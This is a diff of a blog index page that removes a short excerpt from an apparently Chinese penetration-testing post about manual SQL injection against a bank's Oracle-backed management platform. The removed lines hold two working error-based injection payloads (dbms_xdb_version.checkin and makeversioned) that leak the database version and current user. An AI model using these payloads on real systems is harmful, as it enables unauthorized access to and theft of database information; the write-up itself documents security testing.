@@ -487,15 +487,6 @@
           <h4 id="注入点发现"><a href="#注入点发现" class="headerlink" title="注入点发现"></a>注入点发现</h4><p>同事在代码审计时发现某银行的管理平台存在sql注入点：</p>
 <p><img src="/2020/07/15/oracle_exec/injectable.png" alt="注入点"></p>
 <p>但是通过sqlmap进行注入点检测时，却检测不出，于是尝试手工注入。</p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>数据库版本：</p>
-<p><img src="/2020/07/15/oracle_exec/oracle_version.png" alt="oracle_version"></p>
-<p>当前用户：</p>
-<p><img src="/2020/07/15/oracle_exec/oracle_user.png" alt="oracle_user"></p>
-<p>版本信息</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>当前用户</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and+(<span class="keyword">select</span>+dbms_xdb_version.makeversioned((<span class="keyword">select</span>+<span class="keyword">user</span>+<span class="keyword">from</span>+dual))+<span class="keyword">from</span>+dual)+<span class="keyword">is</span>+<span class="keyword">not</span>+<span class="literal">null</span>+<span class="comment">--</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2020/07/15/oracle_exec/#more" rel="contents">
